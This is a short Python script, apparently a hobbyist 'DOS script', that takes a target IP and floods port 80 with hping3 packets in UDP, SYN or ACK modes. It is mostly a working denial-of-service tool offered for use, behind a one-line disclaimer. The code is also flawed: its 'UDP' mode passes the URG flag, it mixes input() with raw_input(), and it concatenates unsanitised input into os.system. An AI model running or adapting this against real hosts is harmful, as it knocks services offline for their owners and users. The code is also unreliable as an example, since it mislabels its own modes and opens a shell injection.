#Scripted by Brandon
#Don't use this script for any illegal service
#The power of this script depends on your internet connection
import os

UDP = "UDP"
SYN = "SYN"
ACK = "ACK"

print("Welcome to Brandon's DOS script")


targets_IP = raw_input("What is the target's IP address?")
attack = input("Do you want to do a UDP attack SYN attack or ACK attack?")

if attack == UDP:
	os.system("hping3 -i u100 -U -p 80 " + targets_IP)
if attack == SYN:
	os.system("hping3 -i u100 -S -p 80 " + targets_IP)
if attack == ACK:
	os.system("hping3 -i u100 -A -p 80 " + targets_IP)

